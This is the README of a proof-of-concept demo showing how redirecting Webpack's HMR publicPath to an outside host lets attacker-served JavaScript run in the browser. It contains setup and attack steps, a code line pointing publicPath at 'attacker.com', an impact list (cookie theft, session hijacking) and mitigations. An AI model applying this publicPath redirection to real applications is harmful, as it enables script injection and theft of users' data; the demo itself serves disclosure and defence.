# Webpack HMR publicPath Security Vulnerability Demo

This demo shows how manipulating `publicPath` in Webpack's HMR can lead to arbitrary code execution.

## ⚠️ Warning

This is for educational purposes only. Never exploit this vulnerability in production environments.

## Setup

### 1. Build Webpack with ESM HMR support

Since ESM HMR is still in PR, you need to build webpack from the source:

```bash
# Clone webpack repo
git clone https://github.com/webpack/webpack.git
cd webpack

# Checkout the ESM HMR branch (PR #19616)
git fetch origin pull/19616/head:esm-hmr
git checkout esm-hmr

# Install dependencies and build
pnpm install

# Create a package
pnpm pack

# You'll get a file like webpack-5.99.9.tgz
# Copy this path for the next step
```

### 2. Install dependencies

```bash
# In vulnerable-app directory
cd vulnerable-app

# Install the custom webpack build
pnpm add file:/path/to/webpack-5.99.9.tgz

# Install other dependencies
pnpm install

# In attacker-server directory
cd ../attacker-server
pnpm install
```

### 3. Run the demo

```bash
# Terminal 1: Start attacker server
cd attacker-server
pnpm start

# Terminal 2: Start vulnerable app
cd vulnerable-app
pnpm start
```

## Attack Steps

1. Open http://localhost:8080 in your browser
2. Open browser console (F12)
3. Click "Inject Malicious publicPath" button
4. Edit `src/module.js` and save to trigger HMR
5. See the malicious code execute

## How it works

When `publicPath` is changed to an external URL, Webpack's HMR will load update chunks from that URL instead of the local server. This allows an attacker to inject arbitrary JavaScript code.

```javascript
// The vulnerability
__webpack_require__.p = 'http://attacker.com/';
```

## Impact

- Cross-Site Scripting (XSS)
- Data theft (localStorage, cookies, etc.)
- Session hijacking

## Mitigation

1. **Never use HMR in production**
2. **Use fixed publicPath**:
   ```javascript
   output: {
     publicPath: '/'
   }
   ```
3. **Apply Content Security Policy (CSP)**
4. **Validate and sanitize all external inputs**

## Note

This vulnerability exists in all HMR implementations (CommonJS, JSONP, ESM), not just ESM.


